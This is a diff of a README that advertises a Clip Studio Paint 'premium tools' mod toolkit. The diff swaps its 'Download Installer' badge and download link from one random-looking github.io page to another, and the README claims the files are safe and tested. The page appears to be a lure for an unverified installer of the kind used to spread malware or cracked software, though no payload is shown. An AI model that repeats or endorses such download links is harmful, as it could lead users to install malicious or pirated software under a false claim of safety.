@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive mod toolkit for Clip Studio Paint, enhancing your digital art experience with premium features and tools. It includes a collection of brushes, materials, and animation utilities optimized for Windows 10 and 11, perfect for artists seeking to expand their creative possibilities.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -61,7 +61,7 @@ While we ensure the files are safe and tested, always download from trusted sour
 
 To get the latest version of Clip Studio Paint Premium Tools, use the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## License
 
